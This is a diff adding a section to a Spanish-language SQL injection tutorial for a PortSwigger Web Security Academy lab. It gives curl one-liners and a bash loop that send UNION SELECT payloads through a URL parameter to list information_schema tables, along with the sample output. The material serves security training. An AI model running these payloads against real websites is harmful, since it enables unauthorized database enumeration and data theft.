@@ -91,6 +91,50 @@ Más potente que limit, y siempre que las circunstancias lo permitan, podemos us
 
 ![Captura](./Imágenes/web_6.png)
 
+### curl
+
+En caso de obtener muchos resultados, y tener que usar limit sea algo lento de iterar, podemos o bien crear un script en bash que automatice esto, o usar el siguiente oneliner con curl 
+
+```bash
+curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%201,1--%20-
+```
+
+![Captura](./Imágenes/curl_1.png)
+
+```bash
+curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%201,1--%20- | grep "<td>" | html2text
+```
+
+Resultado:
+
+```bash
+CHECK_CONSTRAINTS
+```
+
+```bash
+for i in $(seq 1 100); do echo "[+] Para el nº $i: $(curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%20$i,1--%20- | grep "<td>" | html2text)"; done
+```
+
+En caso de no obtener la respuesta, entrecomillar URL
+
+```bash
+for i in $(seq 1 100); do echo "[+] Para el nº $i: $(curl -s -X GET "https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "<td>" | html2text)"; done
+```
+
+Resultado:
+
+```bash
+[+] Para el nº 1: CHECK_CONSTRAINTS
+[+] Para el nº 2: COLLATIONS
+[+] Para el nº 3: COLLATION_CHARACTER_SET_APPLICABILITY
+[+] Para el nº 4: COLUMNS
+[+] Para el nº 5: COLUMNS_EXTENSIONS
+[+] Para el nº 6: COLUMN_STATISTICS
+[+] Para el nº 7: EVENTS
+[+] Para el nº 8: FILES
+[+] Para el nº 9: INNODB_DATAFILES
+[+] Para el nº 10: INNODB_FOREIGN
+```
 
 ## Listar tablas de una base de datos
 
